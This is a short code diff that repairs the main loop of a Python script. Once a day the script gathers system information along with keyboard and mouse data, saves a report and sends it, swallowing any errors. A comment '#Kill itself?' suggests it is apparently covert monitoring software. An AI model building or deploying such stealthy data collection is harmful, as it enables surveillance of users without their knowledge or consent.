@@ -68,13 +68,15 @@ def send_report(filename):
 if __name__ == "__main__":
     report_interval = 86400 #86400 is 24 hours in secs
     while True:
-       try:
-          sys_info = 
-  
-  sys_info = gather_system_info()
-  keyboard_info = keyboard_info()
-  mouse_info = 
-  report_file = save_report(sys_info)
-  send_report(report_file)
+        try:
+            sys_info = gather_system_info()
+            keyboard_info = keyboard_info()
+            mouse_info = mouse_info()
+            report_file = save_report(sys_info)
+            send_report(report_file)
+        except Exception as E:
+                pass
+                #Kill itself?
+        time.sleep(report_interval) 
 
 
